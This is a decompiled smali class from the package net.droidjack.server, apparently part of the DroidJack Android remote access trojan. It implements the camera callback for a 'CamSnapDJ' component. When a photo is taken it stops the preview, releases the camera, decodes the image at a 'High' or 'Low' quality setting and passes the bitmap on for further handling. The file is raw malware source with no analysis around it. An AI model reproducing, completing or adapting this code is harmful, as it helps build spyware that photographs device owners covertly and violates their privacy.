.class Lnet/droidjack/server/h;
.super Ljava/lang/Object;

# interfaces
.implements Landroid/hardware/Camera$PictureCallback;


# instance fields
.field final synthetic a:Lnet/droidjack/server/CamSnapDJ;


# direct methods
.method constructor <init>(Lnet/droidjack/server/CamSnapDJ;)V
    .locals 0

    iput-object p1, p0, Lnet/droidjack/server/h;->a:Lnet/droidjack/server/CamSnapDJ;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onPictureTaken([BLandroid/hardware/Camera;)V
    .locals 3

    const/4 v1, 0x0

    if-eqz p1, :cond_1

    iget-object v0, p0, Lnet/droidjack/server/h;->a:Lnet/droidjack/server/CamSnapDJ;

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera;->stopPreview()V

    iget-object v0, p0, Lnet/droidjack/server/h;->a:Lnet/droidjack/server/CamSnapDJ;

    invoke-static {v0, v1}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;Z)V

    iget-object v0, p0, Lnet/droidjack/server/h;->a:Lnet/droidjack/server/CamSnapDJ;

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;)Landroid/hardware/Camera;

    move-result-object v0

    invoke-virtual {v0}, Landroid/hardware/Camera;->release()V

    iget-object v0, p0, Lnet/droidjack/server/h;->a:Lnet/droidjack/server/CamSnapDJ;

    invoke-virtual {v0}, Lnet/droidjack/server/CamSnapDJ;->getIntent()Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v0

    const-string v1, "Quality"

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v0, 0x0

    :try_start_0
    const-string v2, "High"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v2

    if-eqz v2, :cond_2

    const/4 v0, 0x0

    array-length v1, p1

    invoke-static {p1, v0, v1}, Landroid/graphics/BitmapFactory;->decodeByteArray([BII)Landroid/graphics/Bitmap;

    move-result-object v0

    :cond_0
    :goto_0
    sget-object v1, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const-string v2, "Picture taken!!"

    invoke-virtual {v1, v2}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    iget-object v1, p0, Lnet/droidjack/server/h;->a:Lnet/droidjack/server/CamSnapDJ;

    invoke-virtual {v1, v0}, Lnet/droidjack/server/CamSnapDJ;->a(Landroid/graphics/Bitmap;)V

    iget-object v0, p0, Lnet/droidjack/server/h;->a:Lnet/droidjack/server/CamSnapDJ;

    invoke-static {v0}, Lnet/droidjack/server/CamSnapDJ;->b(Lnet/droidjack/server/CamSnapDJ;)V

    :cond_1
    :goto_1
    return-void

    :cond_2
    const-string v2, "Low"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    iget-object v0, p0, Lnet/droidjack/server/h;->a:Lnet/droidjack/server/CamSnapDJ;

    invoke-static {v0, p1}, Lnet/droidjack/server/CamSnapDJ;->a(Lnet/droidjack/server/CamSnapDJ;[B)Landroid/graphics/Bitmap;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_1
.end method
